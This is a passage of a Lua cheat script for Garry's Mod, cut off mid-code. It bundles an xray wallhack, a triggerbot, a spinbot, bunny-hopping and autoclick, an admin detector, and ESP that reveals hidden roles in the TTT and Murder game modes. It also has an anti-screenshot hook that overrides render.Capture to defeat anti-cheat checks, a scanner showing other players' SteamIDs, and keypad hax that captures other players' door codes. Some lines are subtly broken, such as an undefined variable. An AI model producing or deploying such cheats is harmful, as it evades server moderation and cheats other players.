                elseif v:GetClass()==("prop_door_rotating") or v:GetClass()==("func_door_rotating") then    
                    v:SetMaterial("models/wireframe")
                    v:SetColor(ColScheme)
                elseif v:IsPlayer() && v:Alive() then    
                    cam.Start3D(EyePos(),EyeAngles())
                    v:SetMaterial(mat2)
                    v:SetRenderMode(4)
                    v:SetColor(ColScheme)
                    render.SuppressEngineLighting( true )
                    render.MaterialOverride( mat1 )
                    render.SetColorModulation( ColSchemeV2.x, ColSchemeV2.y, ColSchemeV2.z )
                    render.SetBlend(0.3)
                    v:DrawModel()
                    render.SetBlend(1)
                    render.SuppressEngineLighting( false )
                    render.MaterialOverride( )
                    cam.End3D()
                end
            end
        end)
    elseif xray then
        xray = false
        for k,v in pairs(ents.GetAll()) do
            if v:GetClass()==("prop_door_rotating") or v:GetClass()==("func_door_rotating") or v:GetClass()== "prop_physics" or v:IsPlayer() then
                v:SetMaterial("")
                v:SetColor(Color(255,255,255))
            end
        end
        hook.Remove("HUDPaint", "xxrayz")
    end
end
concommand.Add("jav_xray_toggle",Xray)
 
 
 
/*------------------------------------------
Crosshair
------------------------------------------*/
hook.Add( "HUDPaint", "jav_crosshair", function( )
        if GetConVarNumber("jav_crosshair_enabled") == 1 then
        surface.DrawCircle(ScrW()/2, ScrH()/2, 14, Color(255,100,0,255))
        surface.DrawCircle(ScrW()/2, ScrH()/2, 2, Color(75,0,0,255))
    end
end)
 
/*------------------------------------------
Rear Vision Mirror
------------------------------------------*/
hook.Add( "HUDPaint", "jav_mirror", function( )
        if GetConVarNumber("jav_mirror_enabled") == 1 then
        local CamData = {}
        local ang = LocalPlayer():EyeAngles()
        CamData.angles = Angle(ang.p - ang.p - ang.p, ang.y - 180, ang.r)
        CamData.origin = LocalPlayer():GetShootPos()
        CamData.x, CamData.y, CamData.w, CamData.h = 1620, 0, 300, 300
        render.RenderView( CamData )
        draw.RoundedBox(1, (ScrW() / 2) - 1.5, (ScrH() / 2) - 1.5, 3, 3, Color(255,255,255,255))
    end
end )
 
 
/*------------------------------------------
Triggerbot
------------------------------------------*/
 
local toggler = 0
 
local function triggerbot(cmd)
    if GetConVarNumber("jav_triggerbot_enabled") == 1 then
    if LocalPlayer():Alive() then
        local td = {start = LocalPlayer():GetShootPos(), endpos = LocalPlayer():GetShootPos() + LocalPlayer():EyeAngles():Forward() * 65535, filter = LocalPlayer(), mask = MASK_SHOT}
        local tr = util.TraceLine(td)
        local target = tr.Entity
        if target:IsValid() then
            if IsValid(LocalPlayer():GetActiveWeapon()) then
                if LocalPlayer():GetActiveWeapon():Clip1() > 0 then
                    if target:IsPlayer() or target:IsNPC() then
                        if toggler == 0 then
                            cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_ATTACK))
                            toggler = 1
                        else
                            cmd:SetButtons(bit.band(cmd:GetButtons(), bit.bnot(IN_ATTACK)))
                            toggler = 0
                        end
                    end
                end
            end
        end
    end
end
end
 
hook.Add("CreateMove", "triggerbot", triggerbot)
 
/*------------------------------------------
TTT Magneto Toss
------------------------------------------*/
 
function SpinBot()
    timer.Simple(.02,Turn)
    timer.Simple(.04,Turn)
    timer.Simple(.06,Turn)
    timer.Simple(.08,Turn)
    timer.Simple(.10,Turn)
    timer.Simple(.12,Turn)
    timer.Simple(.14,Turn)
    timer.Simple(.16,Turn)
    timer.Simple(.18,Turn)
    timer.Simple(.20,Turn)
    timer.Simple(.22,Turn)
    timer.Simple(.24,Turn)
    timer.Simple(.26,Turn)
    timer.Simple(.28,Turn)
    timer.Simple(.30,Turn)
    timer.Simple(.32,Turn)
    timer.Simple(.34,Turn)
    timer.Simple(.36,Turn)
    timer.Simple(.38,Turn)
    timer.Simple(.40,Turn)
    timer.Simple(.42,Turn)
    timer.Simple(.44,Turn)
    timer.Simple(.46,Turn)
    timer.Simple(.48,Turn)
    timer.Simple(.50,Turn)
    timer.Simple(.52,Turn)
    timer.Simple(.54,Turn)
    timer.Simple(.56,Turn)
    timer.Simple(.58,Turn)
    timer.Simple(.60,Turn)
    timer.Simple(.62,Turn)
    timer.Simple(.64,Turn)
    timer.Simple(.66,Turn)
    timer.Simple(.68,Turn)
    timer.Simple(.70,Turn)
    timer.Simple(.72,Turn)
end
 
function Turn()
-- Turn function
    LocalPlayer():SetEyeAngles(LocalPlayer():EyeAngles()-Angle(0,10,0))
end
 
local spinning = false
concommand.Add( "jav_spinbot", function()
        spinning = !spinning
        if( spinning ) then
            SpinBot()
                timer.Create( "spinning", 0.74, 0, function()
                        SpinBot()
                end )
        else
                timer.Destroy( "spinning" )
        end
end )
 
/*------------------------------------------
Bhop Script
------------------------------------------*/
hook.Add( "CreateMove", "jav_bhop", function( cmd )
 
    if GetConVarNumber("jav_bhop_enabled") == 1 then
        if !LocalPlayer():IsFlagSet( FL_ONGROUND ) then
        cmd:SetButtons( bit.band( cmd:GetButtons(), bit.bnot( IN_JUMP ) ) )
        end
    end
 
end )
 
/*------------------------------------------
Auto Clicker
------------------------------------------*/
 
local spam = 0
 
local function autoclick(cmd)
if GetConVarNumber("jav_autoclick_enabled") == 1 then
    if LocalPlayer():Alive() && input.IsMouseDown( 107 ) then
        if spam == 0 then
            cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_ATTACK))
            spam = 1
            else
            cmd:SetButtons(bit.band(cmd:GetButtons(), bit.bnot(IN_ATTACK)))
            spam = 0
        end
    end
 
    if LocalPlayer():Alive() && input.IsMouseDown( 108 ) then
        if spam == 0 then
            cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_ATTACK2))
            spam = 1
            else
            cmd:SetButtons(bit.band(cmd:GetButtons(), bit.bnot(IN_ATTACK2)))
            spam = 0
        end
    end
 
end
end
 
hook.Add("CreateMove", "autoclick2", autoclick)
 
/*------------------------------------------
Flashlight Spammer
------------------------------------------*/
 
hook.Add( "Think", "jav_flashlight", function()
 
    if GetConVarNumber("jav_flashlight_enabled") == 1 && input.IsKeyDown(KEY_F) then
        LocalPlayer():ConCommand("impulse 100")
    end
 
end )
 
 
/*------------------------------------------
Admin Detector
------------------------------------------*/
 
concommand.Add("jav_printadmins", function()
    local plys = player.GetAll()
    for k, v in pairs(plys) do
        if v:GetNWString("usergroup") != "user" then
            print(v:GetName() .. string.rep("\t", math.Round(8 / #v:GetName())), v:GetNWString("usergroup"))
        end
    end
end)
 
 
concommand.Add("jav_toggle", function()
    if GetConVarNumber("jav_autoaim_enabled") == 0 then
        LocalPlayer():ConCommand("jav_autoaim_enabled 1")
    elseif GetConVarNumber("jav_autoaim_enabled") == 1 then
        LocalPlayer():ConCommand("jav_autoaim_enabled 0")
    end
end)
 
/*------------------------------------------
Witness Script
------------------------------------------*/
 
    local Cap = math.cos(math.rad(45))
    local Offset = Vector(0, 0, 32)
    local Trace = {}
    local WitnessColor = Color (0,0,0)
 
    function Draw()
    if GetConVarNumber("jav_witness_enabled") == 1 then
        local Time = os.time() - 1
        local Witnesses = 0
        local BeingWitnessed = true
 
        if Time < os.time() then
            Time = os.time() + .5
            Witnesses = 0
            BeingWitnessed = false
            for k, pla in pairs(player.GetAll()) do
                if pla:IsValid() and pla != LocalPlayer() then
                    Trace.start  = LocalPlayer():EyePos() + Offset
                    Trace.endpos = pla:EyePos() + Offset
                    Trace.filter = {pla, LocalPlayer()}
 
                    TraceRes = util.TraceLine(Trace)
 
                    if !TraceRes.Hit then
                        if (pla:EyeAngles():Forward():Dot((LocalPlayer():EyePos() - pla:EyePos())) > Cap) then
                            Witnesses = Witnesses + 1
                            BeingWitnessed = true
 
                        end
                    end
                end
            end
        end
 
        if BeingWitnessed == false then
            WitnessColor = Color (200,150,0)
        else
            WitnessColor = Color (255,0,0)
        end
    draw.SimpleTextOutlined( Witnesses.." People can see you", "Trebuchet18", (ScrW() / 2) - 65, 30, Color(255,150,0),4,1,1,Color(0,0,0))
    surface.SetDrawColor( WitnessColor )
    surface.DrawRect( (ScrW() / 2) - 65, 40, 120, 4 )
 
    end
    end
    hook.Add("HUDPaint", "WitnessesBox", Draw)
 
/*------------------------------------------
Anti Screenshot (taken from lennys scripts)
------------------------------------------*/
 
 
local missingpng = file.Read("materials/missing256.png", "GAME")
 
local noided_dummy = "iVBORw0KGgoAAAANSUhEUgAAAAcAAAAECAIAAADNpLIqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAYSURBVBhXY2BgYmBmYGFgZEAFlIkyMAAACDAAKdIBq3cAAAAASUVORK5CYII="
 
/*
###############
 ACTUAL SCRIPT
###############
*/
local actualRenderCapture = _G.render.Capture
local encodeData      = util.Base64Encode;
 
local enabled = CreateClientConVar("jav_antiscreenshot", "1")
local function antiscreenshot()
    if enabled:GetBool() then
        _G.render.Capture = function(data)
            if data.format == "jpeg" then
                return missingpng
            elseif data.format == "png" then
                return missingpng
            end
        end
   
        util.Base64Encode = function( str )
            local encoding = encodeData( missingpng );
           
            return( noided_dummy );
        end
    else
        _G.render.Capture = actualRenderCapture
        util.Base64Encode = encodeData;
    end
end
antiscreenshot()
cvars.AddChangeCallback("jav_antiscreenshot", antiscreenshot)
 
 
/*------------------------------------------
Murder Hax (originally coded by deagler)
------------------------------------------*/
 
 
local function murderhaks()
if GetConVarNumber("jav_murderhax") == 1 then
    for _,v in pairs (player.GetAll()) do
        for k2, v2 in pairs(v:GetWeapons()) do
            if string.find(v2:GetPrintName(), "Knife") then
                local man = v2.Owner
                local pos = (man:GetPos() + Vector(0,0,60)):ToScreen()
                local col = man:GetPlayerColor()
 
                draw.SimpleTextOutlined( "Murderer!", "Trebuchet20", plypos.x - 32, plypos.y - 40, Color(255, 0, 0),4,1,1,Color(0,0,0))
            end
            if string.find(v2:GetPrintName(), "Magnum") and v2.Owner then
                local man = v2.Owner
                local pos =  (man:GetPos() + Vector(0,0,60)):ToScreen()
                local col = man:GetPlayerColor()
 
                draw.SimpleTextOutlined( "Gun Holder", "Trebuchet20", plypos.x - 36, plypos.y - 40, Color(255, 255, 0),4,1,1,Color(0,0,0))
            end
        end
    end
 
 
    for b,c in pairs(ents.FindByClass("mu_loot")) do
             local pos = ( c:GetPos() + Vector( 0,0,30 ) ):ToScreen()
             local LootDist = (math.floor(c:GetPos():Distance(LocalPlayer():GetPos())) / 0.02)
            draw.SimpleTextOutlined( "Loot "..LootDist.."m", "Trebuchet18", pos.x, pos.y, Color( 0, 255, 0, 255 ),4,1,1,Color(0,0,0))
        end
end
end
 
hook.Add("RenderScreenspaceEffects", "murderhax", murderhaks)
 
/*------------------------------------------
TTT Hax
------------------------------------------*/
 
local matOverlay = Material( "sprites/glow08" )
local matTraitor = Material( "sprites/dot" )
local twep = {"spiderman's_swep", "weapon_ttt_trait_defilibrator", "weapon_ttt_xbow", "weapon_ttt_dhook", "weapon_awp", "weapon_ttt_ak47", "weapon_jihadbomb", "weapon_ttt_knife", "weapon_ttt_c4", "weapon_ttt_decoy", "weapon_ttt_flaregun", "weapon_ttt_phammer", "weapon_ttt_push", "weapon_ttt_radio", "weapon_ttt_sipistol", "weapon_ttt_teleport", "weapon_ttt_awp", "weapon_mad_awp", "weapon_real_cs_g3sg1", "weapon_ttt_cvg_g3sg1", "weapon_ttt_g3sg1", "weapon_ttt_healthstation5", "weapon_ttt_sentry", "weapon_ttt_poison_dart", "weapon_ttt_trait_defibrillator"}
 
for _,v in pairs(player.GetAll()) do
v.HatTraitor = nil
end
for _,v in pairs(ents.GetAll()) do
v.HatESPTracked = nil
end
 
hook.Add("PostDrawOpaqueRenderables", "wire_animations_idle", function()
if GetConVarNumber("jav_ttthax") == 1 then
if GAMEMODE.round_state != ROUND_ACTIVE then
for _,v in pairs(player.GetAll()) do
v.HatTraitor = nil
end
for _,v in pairs(ents.GetAll()) do
v.HatESPTracked = nil
end
return
end
for _,v in pairs( ents.GetAll() ) do
if v and IsValid(v) and (table.HasValue(twep, v:GetClass()) and !v.HatESPTracked) then
local pl = v.Owner
if pl and IsValid(pl) and pl:IsTerror() then
if pl:IsDetective() then
v.HatESPTracked = true
else
v.HatESPTracked = true
pl.HatTraitor = true
chat.AddText( pl, Color(255,125,0), " is a ",Color(255,0,0), "TRAITOR",Color(255,125,0), " with a ",Color(255,0,0),v:GetClass().."!")
end
end
end
end
 
end
 
end)
 
/*------------------------------------------
DarkRP name changer (taken from lennys scripts)
------------------------------------------*/
 
firstname = {
    "Richard",
    "Jack",
    "John",
    "Luke",
    "Cameron",
    "Joe",
    "Peter",
    "Aaron",
    "Chris",
    "Matthew",
    "Paul",
    "Floyd",
    "Trevor",
    "Travis",
    "Owen",
    "Seth",
    "Nathan",
    "Alan",
    "Dale",
    "Albert",
    "Blake",
    "William",
    "Ben",
    "Bruce",
    "Byron",
    "Brad",
    "Carlos",
    "Craig",
    "Cory",
    "Cole",
    "Carter",
    "Connor",
    "Duncan",
    "Dwight",
    "Dominic",
    "Eli",
    "Derrick",
    "Brett",
    "Brian",
    "Charles",
    "Isaac",
    "Gavin",
    "Dylan",
    "Elvis",
    "Kyle",
    "Kurt",
    "Kevin",
    "Justin",
    "Michael",
    "Max",
    "Mario",
    "Leonardo",
    "Liam",
    "Norman",
    "Oliver",
    "Ray",
    "Troy",
    "Xavier",
    "Zack",
    "Alanna",
    "Abby",
    "Alice",
    "Amber",
    "Beatrice",
    "Beth",
    "Bridget",
    "Kate",
    "Clara",
    "Carol",
    "Cassie",
    "Jane",
    "Fiona",
    "Cynthia",
    "Deborah",
    "Denise",
    "Diana",
    "Elise",
    "Lisa",
    "Lacey",
    "Emma",
    "Gabriel",
    "Hayley",
    "Harley",
    "Heidi",
    "Holly",
    "Ivy",
    "Helen",
    "Jamie",
    "Jackie",
    "Jenna",
    "Josephine",
    "Julia",
    "Kelly",
    "Lara",
    "Lily",
    "Maia",
    "Amanda",
    "Mary",
    "Margaret",
    "Sarah",
    "Sydney",
    "Racheal",
    "Wilson",
    "Kane",
    "David"
}
 
lastname = {
"Smith",
"Jones",
"Anderson",
"Morgan",
"Freeman",
"Wilson",
"Williams",
"Brown",
"Taylor",
"Martin",
"White",
"Howard",
"Bieber",
"Cooper",
"Gray",
"Hardy",
"Thompson",
"Baron",
"Finnegan",
"McDonald",
"Doyle",
"Parker",
"Dawson",
"Mcintyre",
"Redwood",
"Sutherland",
"Harris",
"Presley",
"Cole",
"Corne",
"Colin",
"Lacey",
"Hall",
"Hulley",
"Rayner",
"Cashen",
"Seng",
"Miller",
"Ludon",
"Curry",
"Watson",
"Holmes",
"Cartman",
"Lane",
"Porter",
"Fletcher",
"Hunter",
"Lynch",
"Corbett",
"Barry",
"Kennedy",
"Riley",
"Davis",
"Lennon",
"Odinsson",
"Robson",
"Ferris",
"Pearce",
"Walter",
"Cruz",
"Pratchett",
"Hayes",
"Danliels",
"Gregory",
"Doe",
"Nelson",
"Hale",
"Bryan",
"Ford",
"Holden",
"Burns",
"Mcneal",
"Deere"
}
 
 
function randomrpname()
LocalPlayer():ConCommand("darkrp rpname "..table.Random(firstname).." "..table.Random(lastname))
end
concommand.Add("jav_newname",randomrpname)
 
 
 
/*------------------------------------------
Spirit Walk
------------------------------------------*/
 
 
local SW = {}
 
SW.Enabled = false
SW.ViewOrigin = Vector( 0, 0, 0 )
SW.ViewAngle = Angle( 0, 0, 0 )
SW.Velocity = Vector( 0, 0, 0 )
 
function SW.CalcView( ply, origin, angles, fov )
        if ( !SW.Enabled ) then return end
        if ( SW.SetView ) then
                SW.ViewOrigin = origin
                SW.ViewAngle = angles
               
                SW.SetView = false
        end
        return { origin = SW.ViewOrigin, angles = SW.ViewAngle }
end
hook.Add( "CalcView", "SpiritWalk", SW.CalcView )
 
function SW.CreateMove( cmd )
        if ( !SW.Enabled ) then return end
       
        // Add and reduce the old velocity.
        local time = FrameTime()
        SW.ViewOrigin = SW.ViewOrigin + ( SW.Velocity * time )
        SW.Velocity = SW.Velocity * 0.95
       
        // Rotate the view when the mouse is moved.
        local sensitivity = 0.022
        SW.ViewAngle.p = math.Clamp( SW.ViewAngle.p + ( cmd:GetMouseY() * sensitivity ), -89, 89 )
        SW.ViewAngle.y = SW.ViewAngle.y + ( cmd:GetMouseX() * -1 * sensitivity )
       
        // What direction we're going to move in.
        local add = Vector( 0, 0, 0 )
        local ang = SW.ViewAngle
        if ( cmd:KeyDown( IN_FORWARD ) ) then add = add + ang:Forward() end
        if ( cmd:KeyDown( IN_BACK ) ) then add = add - ang:Forward() end
        if ( cmd:KeyDown( IN_MOVERIGHT ) ) then add = add + ang:Right() end
        if ( cmd:KeyDown( IN_MOVELEFT ) ) then add = add - ang:Right() end
        if ( cmd:KeyDown( IN_JUMP ) ) then add = add + ang:Up() end
        if ( cmd:KeyDown( IN_DUCK ) ) then add = add - ang:Up() end
       
        // Speed.
        add = add:GetNormal() * time * 500
        if ( cmd:KeyDown( IN_SPEED ) ) then add = add * 2 end
       
        SW.Velocity = SW.Velocity + add
       
        // This stops us looking around crazily while spiritwalking.
        if ( SW.LockView == true ) then
                SW.LockView = cmd:GetViewAngles()
        end
        if ( SW.LockView ) then
                cmd:SetViewAngles( SW.LockView )
        end
       
        // This stops us moving while spiritwalking.
        cmd:SetForwardMove( 0 )
        cmd:SetSideMove( 0 )
        cmd:SetUpMove( 0 )
end
hook.Add( "CreateMove", "SpiritWalk", SW.CreateMove )
 
function SW.Toggle()
        SW.Enabled = !SW.Enabled
        SW.LockView = SW.Enabled
        SW.SetView = true
       
        local status = { [ true ] = "ON", [ false ] = "OFF" }
        print( "SpiritWalk " .. status[ SW.Enabled ] )
end
concommand.Add( "jav_spiritwalk", SW.Toggle )
 
concommand.Add( "jav_spiritwalk_printpos", function() print( SW.ViewOrigin ) end )
 
 
/*------------------------------------------
Entity Scanner
------------------------------------------*/
 
targdist = 0
targmodel = nil
targname = nil
targrank = nil
targteam = nil
targteamcolor = Color(255,255,255)
targhealth = nil
targactive = nil
targpos = nil
 
function Scanner()
if GetConVarNumber("jav_scanner_enabled") == 1 then
    local tr = LocalPlayer():GetEyeTrace()
    if not tr.Entity then return end
    local target = tr.Entity
 
    if target:GetClass():lower() == "player" then
    targdist = (math.floor(target:GetPos():Distance(LocalPlayer():GetPos())) * 0.02 )
    targmodel = target:GetModel()
    targname = target:Nick()
    targrank = target:GetUserGroup()
    targteamcolor = team.GetColor(target:Team())
    targteam = team.GetName(target:Team())
    targhealth = target:Health()
    targindex = target:EntIndex()
    targid = target:SteamID()
    targposx = math.Round(target:GetPos().x)
    targposy = math.Round(target:GetPos().y)
    targposz = math.Round(target:GetPos().z)
    if targid == "NULL" then targid = "Bots have no SteamID" end
    targactive = target:GetActiveWeapon():GetPrintName()
    end
 
 
    if target:GetClass():lower() != "player" && target:GetClass():lower() != "worldspawn" then
    targname = target:GetClass()
    targdist = (math.floor(target:GetPos():Distance(LocalPlayer():GetPos())) * 0.02 )
    targmodel = target:GetModel()
    targindex = target:EntIndex()
    targposx = math.Round(target:GetPos().x)
    targposy = math.Round(target:GetPos().y)
    targposz = math.Round(target:GetPos().z)
    targrank = "N/A"
    targteam = "N/A"
    targhealth = "N/A"
    targid = "N/A"
    targactive = "N/A"
end
end
end
hook.Add( "Think", "PropScanner", Scanner )
 
hook.Add( "HUDPaint", "jav_scandata", function( )
if GetConVarNumber("jav_scanner_enabled") == 1 then
 
    surface.SetDrawColor( 0,0,0,150 )
    surface.DrawRect( 410, ScrH() / 2 - 110, 450, 220 )
    surface.SetDrawColor( 255,150,0,155 )
    surface.DrawRect( 500, ScrH() / 2 - 110, 2, 220 )
 
    draw.SimpleTextOutlined( "Name/Type:", "Trebuchet18", 420, ScrH() / 2 - 100, Color(255,255,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( "Rank:", "Trebuchet18", 420, ScrH() / 2 - 80, Color(255,255,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( "Team:", "Trebuchet18", 420, ScrH() / 2 - 60, Color(255,255,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( "Health:", "Trebuchet18", 420, ScrH() / 2 - 40, Color(255,255,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( "Distance:", "Trebuchet18", 420, ScrH() / 2 - 20, Color(255,255,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( "Model:", "Trebuchet18", 420, ScrH() / 2, Color(255,255,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( "Ent Index:", "Trebuchet18", 420, ScrH() / 2 + 20, Color(255,255,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( "SteamID:", "Trebuchet18", 420, ScrH() / 2 + 40, Color(255,255,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( "Active Wep:", "Trebuchet18", 420, ScrH() / 2 + 60, Color(255,255,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( "Position:", "Trebuchet18", 420, ScrH() / 2 + 80, Color(255,255,255),4,1,1,Color(0,0,0))
 
    draw.SimpleTextOutlined( targname, "Trebuchet18", 510, ScrH() / 2 - 100, Color(255,255,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( targdist.."m", "Trebuchet18", 510, ScrH() / 2 - 80, Color(255,255,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( targmodel, "Trebuchet18", 510, ScrH() / 2 - 60, Color(255,255,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( targrank, "Trebuchet18", 510, ScrH() / 2 - 40, Color(255,255,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( targteam, "Trebuchet18", 510, ScrH() / 2 - 20, targteamcolor,4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( targhealth, "Trebuchet18", 510, ScrH() / 2, Color(100,255,100),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( targindex, "Trebuchet18", 510, ScrH() / 2 + 20, Color(255,255,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( targid, "Trebuchet18", 510, ScrH() / 2 + 40, Color(220,220,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( targactive, "Trebuchet18", 510, ScrH() / 2 + 60, Color(255,255,0),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( "X: "..tostring(targposx), "Trebuchet18", 510, ScrH() / 2 + 80, Color(255,205,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( "Y: "..tostring(targposy), "Trebuchet18", 570, ScrH() / 2 + 80, Color(255,205,255),4,1,1,Color(0,0,0))
    draw.SimpleTextOutlined( "Z: "..tostring(targposz), "Trebuchet18", 630, ScrH() / 2 + 80, Color(255,205,255),4,1,1,Color(0,0,0))
end
end)
 
/*------------------------------------------
Entity Finder ESP
------------------------------------------*/
 
 
//Toggle command
local showing = true
 
concommand.Add("jav_entfinder_toggle", function()
    if showing then
        showing = false
    else
        showing = true
    end
end)
 
//Everything menu related
local EntsToShow = {}
local OtherEnts = {}
 
concommand.Add("jav_entfinder_menu", function(ply, cmd, args)
    function Reload(startX, startY)
        table.Empty(OtherEnts)
        for k,v in pairs(ents.GetAll()) do
            local addToAllEnts = true
           
            for i,p in pairs(EntsToShow) do
                if p == v:GetClass() then
                    addToAllEnts = false
                end
            end
           
            for i,p in pairs(OtherEnts) do
                if p == v:GetClass() then
                    addToAllEnts = false
                end
            end
           
            if addToAllEnts then
                table.insert(OtherEnts, v:GetClass())
            end
        end
 
        local main = vgui.Create( "DFrame" )
        main:SetSize( 400, 300 )
        if startX and startY then
            main:SetPos(startX, startY)
        else
            main:Center()
        end
        main:SetTitle( "" )
        main:SetVisible( true )
        main:SetDraggable( true )
        main:ShowCloseButton( true )
        main:MakePopup()
        main.Paint = function()
            draw.RoundedBox( 4, 0, 0, main:GetWide(), main:GetTall(), Color( 0, 0, 0, 200 ) )
        end
 
        local EFtoggle = vgui.Create( "DButton" )
    EFtoggle:SetParent( main )  
    EFtoggle:SetPos( 25, 10 )
    EFtoggle:SetTextColor( Color(255, 255, 255, 255) )
    EFtoggle:SetSize( 110, 25 )
    EFtoggle:SetToolTip( "Toggle Ent Finder" )
    EFtoggle.Paint = function()
    surface.SetDrawColor( 60, 30, 0, 200 )
    EFtoggle:SetText( "Toggle Ent Finder" )
    surface.DrawRect( 0, 0, EFtoggle:GetWide(), EFtoggle:GetTall() )
    end
    EFtoggle.DoClick = function() RunConsoleCommand("jav_entfinder_toggle") end
 
    local EFdistlabel = vgui.Create( "DLabel", Panel )
    EFdistlabel:SetParent(main)
    EFdistlabel:SetPos( 145, 15 )
    EFdistlabel:SetText( "Draw Distance:" )
    EFdistlabel:SizeToContents()
 
    local EFdistbox = vgui.Create( "DNumberWang" )// Create the checkbox
    EFdistbox:SetPos( 225, 12 )
    EFdistbox:SetParent(main)
    EFdistbox:SetMin(0)
    EFdistbox:SetMax(999999)
    EFdistbox:SetConVar( "jav_entfinder_distance" )
    EFdistbox:SetToolTip( "how far away you can see target entities from, it would be a good idea to set this low when looking for a common entity to avoid lag" )
   
 
 
        DermaList = vgui.Create( "DPanelList", main )
        DermaList:SetPos( 25,45 )
        DermaList:SetSize( 700, 500 )
        DermaList:SetSpacing( 75 )
        DermaList:EnableHorizontal( false )
        DermaList:EnableVerticalScrollbar( true )
       
        local SelectedEnts = vgui.Create("DListView")
        SelectedEnts:SetSize(150, 200)
        SelectedEnts:SetPos(0, 0)
        SelectedEnts:SetMultiSelect(false)
        SelectedEnts:AddColumn("Ents to show")
        for k,v in pairs(EntsToShow) do
            SelectedEnts:AddLine(v)
        end
        SelectedEnts.DoDoubleClick = function(parent, index, list)
            table.remove(EntsToShow, index)
            main:Close()
            local x, y = main:GetPos()
            Reload(x, y)
        end
        DermaList:Add(SelectedEnts)
       
        local AllEnts = vgui.Create("DListView")
        AllEnts:SetSize(150, 200)
        AllEnts:SetPos(200, 0)
        AllEnts:SetMultiSelect(false)
        AllEnts:AddColumn("Ents not to show")
        for k,v in pairs(OtherEnts) do
            AllEnts:AddLine(v)
        end
        AllEnts.DoDoubleClick = function(parent, index, list)
            table.insert(EntsToShow, OtherEnts[index])
            main:Close()
            local x, y = main:GetPos()
            Reload(x, y)
        end
        DermaList:Add(AllEnts)
    end
    Reload()
end)
 
//Actually drawing information
hook.Add("HUDPaint", "ShowEnts", function()
    if showing then
        for k,v in pairs(ents.GetAll()) do
            local drawing = false
 
           
            for i,p in pairs(EntsToShow) do
                if v:GetClass() == p then
                    drawing = true
                end
            end
 
            local Dist = math.floor(v:GetPos():Distance(LocalPlayer():GetPos()))
            local DrawDist = (GetConVarNumber("jav_entfinder_distance") / 0.02)
           
            if drawing && (Dist < DrawDist) then
                local stuff = v:GetPos():ToScreen()
               
                local text = v:GetClass()
                draw.SimpleTextOutlined( text, "Trebuchet18", stuff.x - 35, stuff.y - 15, Color(255,255,255),4,1,1,Color(0,0,0))
               
                surface.SetDrawColor( 255, 150, 0, 255)
                surface.DrawRect( stuff.x - 4, stuff.y -4 , 8, 8)
            end
        end
    end
end)
 
 
/*------------------------------------------
Keypad Hax
------------------------------------------*/
 
 
 
local X = -50
local Y = -100
 
local KeyPos =  {  
{X+5, Y+100, 25, 25, -2.2, 3.45, 1.3, -0},
{X+37.5, Y+100, 25, 25, -0.6, 1.85, 1.3, -0},
{X+70, Y+100, 25, 25, 1.0, 0.25, 1.3, -0},
 
{X+5, Y+132.5, 25, 25, -2.2, 3.45, 2.9, -1.6},
{X+37.5, Y+132.5, 25, 25, -0.6, 1.85, 2.9, -1.6},
{X+70, Y+132.5, 25, 25, 1.0, 0.25, 2.9, -1.6},
 
{X+5, Y+165, 25, 25, -2.2, 3.45, 4.55, -3.3},
{X+37.5, Y+165, 25, 25, -0.6, 1.85, 4.55, -3.3},
{X+70, Y+165, 25, 25, 1.0, 0.25, 4.55, -3.3},
 
{X+5, Y+67.5, 50, 25, -2.2, 4.7, -0.3, 1.6}, 
{X+60, Y+67.5, 35, 25, 0.3, 1.65, -0.3, 1.6}
}
 
local function FindDisplayText(ent)
if ent.GetDisplayText then
return ent:GetDisplayText()
else
return ent.Entity:GetNetworkedInt("keypad_num")
end
end
 
local function FindStatus(ent)
if ent.GetStatus then
return ent:GetStatus()
elseif ent.Entity:GetNetworkedBool("keypad_access") and ent.Entity:GetNetworkedBool("keypad_showaccess") then
return 1
elseif not ent.Entity:GetNetworkedBool("keypad_access") and ent.Entity:GetNetworkedBool("keypad_showaccess") then
return 2
else
return 0
end
end
 
hook.Add("Think", "keypadhax", function()
if GetConVarNumber("jav_keypadhax") == 1 then
for k,v in pairs(player.GetAll()) do
local kp = v:GetEyeTrace().Entity
if IsValid(kp) and (string.find(kp:GetClass(), "keypad") and not(string.find(v:GetClass(), "cracker") or string.find(v:GetClass(), "checker"))) and v:EyePos():Distance(kp:GetPos()) <= 70 then
kp.tempCode = kp.tempCode or ""
kp.tempText = kp.tempText or ""
kp.tempStatus = kp.tempStatus or 0
 
if (FindDisplayText(kp) != kp.tempText) or (FindStatus(kp) != kp.tempStatus) then
kp.tempText = FindDisplayText(kp)
kp.tempStatus = FindStatus(kp)
 
local tr = util.TraceLine({
start = v:EyePos(),
endpos = v:GetAimVector() * 32 + v:EyePos(),
filter = v
})
 
local pos = kp:WorldToLocal(tr.HitPos)
 
for i,p in pairs(KeyPos) do
local x = (pos.y - p[5]) / (p[5] + p[6])
local y = 1 - (pos.z + p[7]) / (p[7] + p[8])
 
if (x >= 0 and y >= 0 and x <= 1 and y <= 1) then
if i == 11 then
if kp.tempStatus == 1 then
kp.code = kp.tempCode
kp.tempCode = ""
elseif kp.tempStatus == 2 then
kp.tempCode = ""
end
elseif i == 10 then
kp.tempCode = ""
elseif i > 0 then
kp.tempCode = kp.tempCode..i
end
end
end
end
end
end
end
end)
 
hook.Add( "HUDPaint", "keypadhaxhud", function()
